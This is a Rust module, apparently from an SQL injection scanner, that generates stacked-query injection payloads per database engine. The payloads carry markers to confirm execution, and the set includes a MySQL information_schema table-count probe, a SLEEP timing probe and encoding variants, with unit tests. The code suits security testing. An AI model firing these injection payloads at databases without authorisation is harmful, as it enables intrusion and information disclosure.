#![deny(unsafe_code)]

use crate::techniques::boolean::payloads::encode_payload;

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct StackedPayload {
    pub payload: String,
    pub dbms: String,
    pub marker: String,
}

impl StackedPayload {
    #[must_use]
    pub fn new(
        payload: impl Into<String>,
        dbms: impl Into<String>,
        marker: impl Into<String>,
    ) -> Self {
        Self {
            payload: payload.into(),
            dbms: dbms.into(),
            marker: marker.into(),
        }
    }
}

/// Generate stacked query payloads per DBMS.
/// Each payload includes a unique marker to verify second statement execution.
#[must_use]
pub fn stacked_payloads_for(dbms: Option<&str>) -> Vec<StackedPayload> {
    let base_marker = format!(
        "stacked_{}",
        uuid::Uuid::new_v4().simple().to_string().replace('-', "")
    );
    #[allow(clippy::match_same_arms)]
    let comment = match dbms {
        Some("mysql") => " -- -",
        Some("postgres") => " --",
        Some("mssql") => " --",
        Some("oracle") => " --",
        _ => " -- -",
    };
    let mut out = Vec::new();
    // Basic SELECT constant
    out.push(StackedPayload::new(
        format!("; SELECT '{base_marker}'{comment}"),
        dbms.unwrap_or("generic"),
        base_marker.clone(),
    ));
    // SELECT with string concat (MySQL/Postgres)
    if matches!(dbms, Some("mysql" | "postgres")) {
        out.push(StackedPayload::new(
            format!("; SELECT CONCAT('{base_marker}'){comment}"),
            dbms.unwrap_or("generic"),
            base_marker.clone(),
        ));
    }
    // Information schema probe (MySQL) - proves stacked works + leaks table count
    if matches!(dbms, Some("mysql")) {
        let infoschema_marker = format!("stacked_infoschema_{}", &base_marker[8..16]);
        out.push(StackedPayload::new(
            format!("; SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE(){comment}"),
            "mysql",
            infoschema_marker,
        ));
    }
    // MySQL sleep as time-based stacked (optional, secondary)
    if matches!(dbms, Some("mysql")) {
        let time_marker = format!("stacked_time_{}", &base_marker[8..16]);
        out.push(StackedPayload::new(
            format!("; SELECT SLEEP(0){comment}"),
            "mysql",
            time_marker,
        ));
    }
    out
}

/// Encoding variants for stacked payloads (URL, double-URL, hex, unicode).
#[must_use]
pub fn encode_stacked_payload(payload: &str, encoding: &str) -> String {
    encode_payload(payload, encoding)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn generates_mysql_payloads_with_marker() {
        let payloads = stacked_payloads_for(Some("mysql"));
        assert!(!payloads.is_empty());
        for p in &payloads {
            assert!(p.marker.contains("stacked_"), "marker: {}", p.marker);
            assert_eq!(p.dbms, "mysql");
        }
    }

    #[test]
    fn generates_postgres_payloads() {
        let payloads = stacked_payloads_for(Some("postgres"));
        assert!(!payloads.is_empty());
        for p in &payloads {
            assert!(p.marker.contains("stacked_"));
            assert!(p.payload.contains("--"));
            assert!(!p.payload.contains("-- -"));
        }
    }

    #[test]
    fn generic_fallback_has_payloads() {
        let payloads = stacked_payloads_for(None);
        assert!(!payloads.is_empty());
        for p in &payloads {
            assert!(p.marker.contains("stacked_"));
        }
    }
}
